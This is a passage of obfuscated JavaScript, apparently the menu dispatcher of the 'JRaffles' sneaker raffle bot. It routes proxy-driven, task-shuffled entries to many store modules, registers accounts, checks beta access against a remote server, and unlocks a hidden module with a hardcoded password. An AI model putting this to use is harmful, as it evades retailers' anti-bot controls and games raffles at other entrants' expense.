                            _0x4c956b = _0x7ef33e['map']((_0x4838fa, _0xb8b825) => {
                                sanatizeProxy = _0x4838fa['replace']('\x0d', '');
                                if (_0x7ef33e[_0xb8b825 + 0x1] != undefined)
                                    return '' + sanatizeProxy;
                                return '' + sanatizeProxy;
                            });
                            var _0x2c9923 = await _0x24545a(_0x5460cd);
                            _0x33c579['shuffleTasks'] && await _0x284bb9(_0x2c9923), await _0x5460cd['function'](_0x5460cd, _0x2c9923, _0x4c956b);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x4c956b = await _0x2db9f0(), _0x2c9923 = await _0x24545a(_0x5460cd);
                                _0x33c579['shuffleTasks'] && await _0x284bb9(_0x2c9923), await _0x5460cd['function'](_0x5460cd, _0x2c9923, _0x4c956b);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x4c956b = await _0x2db9f0();
                                    await _0x5460cd['function'](_0x5460cd, _0x4c956b);
                                }
                            }
                        }
                    } catch (_0x302a15) {
                        console['log'](_0x302a15), await _0x4b01dc(0x7d0);
                    }
                    return _0x3f9947();
                }
                if (_0x5411d6[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                        var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x4c956b = await _0x2db9f0(), _0x7e82b9 = await _0x24545a(_0x5460cd);
                            _0x33c579['shuffleTasks'] && await _0x284bb9(_0x7e82b9), await _0x5460cd['function'](_0x5460cd, _0x7e82b9, _0x4c956b);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x4c956b = await _0x2db9f0(), _0x7e82b9 = await _0x24545a(_0x5460cd);
                                _0x33c579['shuffleTasks'] && await _0x284bb9(_0x7e82b9), await _0x5460cd['function'](_0x5460cd, _0x7e82b9, _0x4c956b);
                            }
                        }
                    } catch (_0x1f7818) {
                        console['log'](_0x1f7818), await _0x4b01dc(0xfa0);
                    }
                    return _0x3f9947();
                }
                if (_0x5411d6[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                        var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x4c956b = await _0x2db9f0(), _0x7e82b9 = await _0x24545a(_0x5460cd);
                            _0x33c579['shuffleTasks'] && await _0x284bb9(_0x7e82b9), await _0x5460cd['function'](_0x5460cd, _0x7e82b9, _0x4c956b);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x4c956b = await _0x2db9f0(), _0x7e82b9 = await _0x24545a(_0x5460cd);
                                _0x33c579['shuffleTasks'] && await _0x284bb9(_0x7e82b9), await _0x5460cd['function'](_0x5460cd, _0x7e82b9, _0x4c956b);
                            }
                        }
                    } catch (_0x2793f8) {
                        console['log'](_0x2793f8), await _0x4b01dc(0xfa0);
                    }
                    return _0x3f9947();
                }
                if (_0x5411d6[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                    var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x4c956b = await _0x2db9f0();
                        return await _0x5460cd['function'](_0x5460cd, _0x4c956b), _0x3f9947();
                    }
                    var _0x4c956b = await _0x2db9f0(), _0x2b9227 = await _0x24545a(_0x5460cd);
                    return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x2b9227), await _0x5460cd['function'](_0x5460cd, _0x2b9227, _0x4c956b), _0x3f9947();
                }
                if (_0x5411d6[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                    var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x4c956b = await _0x2db9f0(), _0x2b9227 = await _0x24545a(_0x5460cd);
                    return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x2b9227), await _0x5460cd['function'](_0x5460cd, _0x2b9227, _0x4c956b), _0x3f9947();
                }
                if (_0x5411d6[taskModule]['name'] == 'AFEW\x20Store' || _0x5411d6[taskModule]['name']['includes']('BACKDOOR')) {
                    taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                    var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x4c956b = await _0x2db9f0(), _0x2b9227 = await _0x24545a(_0x5460cd);
                    return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x2b9227), await _0x5460cd['function'](_0x5460cd, _0x2b9227, _0x4c956b), _0x3f9947();
                }
                if (_0x5411d6[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                    var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x4c956b = await _0x2db9f0(), _0x2b9227 = await _0x24545a(_0x5460cd);
                    return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x2b9227), await _0x5460cd['function'](_0x5460cd, _0x2b9227, _0x4c956b), _0x3f9947();
                } else {
                    if (_0x5411d6[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                        var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x4c956b = await _0x2db9f0(), _0x4cba56 = await _0x24545a(_0x5460cd);
                            return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x4cba56), await _0x5460cd['function'](_0x5460cd, _0x4cba56, _0x4c956b), _0x3f9947();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x4c956b = await _0x2db9f0();
                                return await _0x5460cd['function'](_0x5460cd, null, _0x4c956b), _0x3f9947();
                            }
                        }
                        ;
                    } else {
                        if (_0x5411d6[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                            var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction], _0x4c956b = await _0x2db9f0(), _0x52653c = await _0x24545a(_0x5460cd);
                            return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x52653c), await _0x5460cd['function'](_0x5460cd, _0x52653c, _0x4c956b), await _0x4b01dc(0x1388), _0x3f9947();
                        } else {
                            if (_0x5411d6[taskModule]['name'] == 'Google\x20Forms') {
                                try {
                                    let _0x4b5e54 = { 'headers': { 'content-type': 'application/json' } }, _0xb63fde = { 'key': _0x4faa3d }, _0x357d89 = await _0x4f7750['post']('https://jraffles.herokuapp.com/beta', _0xb63fde, _0x4b5e54);
                                    if (_0x357d89['status'] != 0xc8)
                                        throw new Error('No\x20Beta\x20Access..');
                                    console['log']('Hello,\x20' + _0xd12810['cyan'](_0x4ebc10) + '.\x20Beta\x20Access\x20Granted.'), await _0x4b01dc(0x3e8);
                                } catch (_0x20fbbd) {
                                    return console['log']('No\x20Beta\x20Access.'), await _0x4b01dc(0x7d0), _0x3f9947();
                                }
                                taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                                var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction], _0x4c956b = await _0x2db9f0(), _0x52653c = await _0x24545a(_0x5460cd);
                                return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x52653c), await _0x5460cd['function'](_0x5460cd, _0x52653c, _0x4c956b), await _0x4b01dc(0x1388), _0x3f9947();
                            } else {
                                if (_0x5411d6[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                                    var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x4c956b = await _0x2db9f0(), _0x4cba56 = await _0x24545a(_0x5460cd);
                                        return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x4cba56), await _0x5460cd['function'](_0x5460cd, _0x4cba56, _0x4c956b), _0x3f9947();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x4c956b = await _0x2db9f0();
                                            return await _0x5460cd['function'](_0x5460cd, null, _0x4c956b), _0x3f9947();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x5411d6[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                                        var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x5460cd);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x5411d6[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                                            var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x4c956b = await _0x2db9f0(), _0x4bc750 = await _0x24545a(_0x5460cd);
                                                return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x4bc750), await _0x5460cd['function'](_0x5460cd, _0x4bc750, _0x4c956b), _0x3f9947();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x4c956b = await _0x2db9f0(), _0x4bc750 = await _0x24545a(_0x5460cd);
                                                    return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x4bc750), await _0x5460cd['function'](_0x5460cd, _0x4bc750, _0x4c956b), _0x3f9947();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x5411d6[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                                                var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x4c956b = await _0x2db9f0(), _0x4de9a6 = await _0x24545a(_0x5460cd);
                                                    return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x4de9a6), await _0x5460cd['function'](_0x5460cd, _0x4de9a6, _0x4c956b), _0x3f9947();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x4c956b = await _0x2db9f0(), _0x4de9a6 = await _0x24545a(_0x5460cd);
                                                        return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x4de9a6), await _0x5460cd['function'](_0x5460cd, _0x4de9a6, _0x4c956b), _0x3f9947();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x5411d6[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                                                    var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x4c956b = await _0x2db9f0(), _0x427498 = await _0x24545a(_0x5460cd);
                                                        return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x427498), await _0x5460cd['function'](_0x5460cd, _0x427498, _0x4c956b), _0x3f9947();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x4c956b = await _0x2db9f0(), _0x427498 = await _0x24545a(_0x5460cd);
                                                            return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x427498), await _0x5460cd['function'](_0x5460cd, _0x427498, _0x4c956b), _0x3f9947();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x5411d6[taskModule]['name'] == 'KICKZ') {
                                                        taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                                                        var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x4c956b = await _0x2db9f0(), _0x427498 = await _0x24545a(_0x5460cd);
                                                            return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x427498), await _0x5460cd['function'](_0x5460cd, _0x427498, _0x4c956b), _0x3f9947();
                                                        } else {
                                                            if (taskFunction == 0x1) {
                                                                var _0x4c956b = await _0x2db9f0(), _0x427498 = await _0x24545a(_0x5460cd);
                                                                return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x427498), await _0x5460cd['function'](_0x5460cd, _0x427498, _0x4c956b), _0x3f9947();
                                                            }
                                                        }
                                                        ;
                                                    } else {
                                                        if (_0x5411d6[taskModule]['name'] == 'ADIDAS\x20CONFIRMED') {
                                                            taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                                                            var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                                                            console['clear']();
                                                            if (taskFunction == 0x0 || taskFunction == 0x1 || taskFunction == 0x2 || taskFunction == 0x3 || taskFunction == 0x4) {
                                                                var _0x4c956b = await _0x2db9f0(), _0x270849 = await _0x24545a(_0x5460cd);
                                                                return _0x33c579['shuffleTasks'] && await _0x284bb9(_0x270849), await _0x5460cd['function'](_0x270849, _0x4c956b), _0x3f9947();
                                                            }
                                                        } else {
                                                            if (_0x5411d6[taskModule]['name'] == 'Seven\x20Store')
                                                                return console['log']('returning\x20to\x20menu'), await _0x4b01dc(0x3e8), _0x3f9947();
                                                            else {
                                                                if (_0x5411d6[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                    var _0x1f349b = _0x5411d6[taskModule]['name'], _0x4c956b = await _0x2db9f0();
                                                                    return await _0x22c7c6(_0x1f349b, _0x4c956b), _0x3f9947();
                                                                } else {
                                                                    if (_0x5411d6[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                        taskFunction = await _0x20efaf(_0x5411d6[taskModule]['modules']);
                                                                        var _0x5460cd = _0x5411d6[taskModule]['modules'][taskFunction];
                                                                        return await _0x5460cd['function'](_0x5460cd), _0x3f9947();
                                                                    } else {
                                                                        if (_0x5411d6[taskModule]['name'] == 'Change\x20Settings') {
                                                                            console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                            var _0x48df71 = 0x0;
                                                                            for (const _0x73e2f7 in _0x33c579) {
                                                                                console['log']('(' + _0x48df71 + ')\x20' + _0x73e2f7 + '\x20:\x20' + _0x33c579[_0x73e2f7]), _0x48df71++;
                                                                            }
                                                                            console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x48df71 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                            var _0x4245d0 = await _0x5daa9b();
                                                                            if (_0x4245d0 == _0x48df71)
                                                                                return _0x3f9947();
                                                                            console['clear'];
                                                                            var _0x1bc4dd = 0x0;
                                                                            for (var _0x374475 in _0x33c579) {
                                                                                if (_0x4245d0 == _0x1bc4dd) {
                                                                                    console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x374475 + '\x20:'), _0x33c579[_0x374475] = await _0x7989c7(), _0x3f6207['writeFileSync']('../settings.json', JSON['stringify'](_0x33c579));
                                                                                    break;
                                                                                } else
                                                                                    _0x1bc4dd++;
                                                                            }
                                                                            return console['log']('Settings\x20Saved!'), await _0x4b01dc(0xbb8), _0x3f9947();
                                                                        } else {
                                                                            if (_0x5411d6[taskModule]['name'] == 'Reload\x20Settings')
                                                                                return console['log']('Reloading\x20settings'), await _0x45339b(), _0x3f9947();
                                                                            else {
                                                                                if (taskModule == 0x45) {
                                                                                    _0x5411d6[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                    var _0x880fa4 = await _0x7c691b();
                                                                                    _0x880fa4 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x2d02a0(), await afewFunction(_0x3bc20b[_0x2f2e8b], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x4b01dc(0xbb8));
                                                                                } else {
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x3f9947();
            } catch (_0x118752) {
                return console['log'](_0x118752), await _0x4b01dc(0x2710), _0x3f9947();
            }
        } catch (_0x397f6c) {
            return console['log'](_0x397f6c), await _0x4b01dc(0x3a98);
        }
}
;
_0x369d34('JRaffles\x20' + _0x5ddf1c);
try {
    _0x45339b(), _0x5589bf();
} catch (_0x58ac73) {
    console['log'](_0x58ac73);
}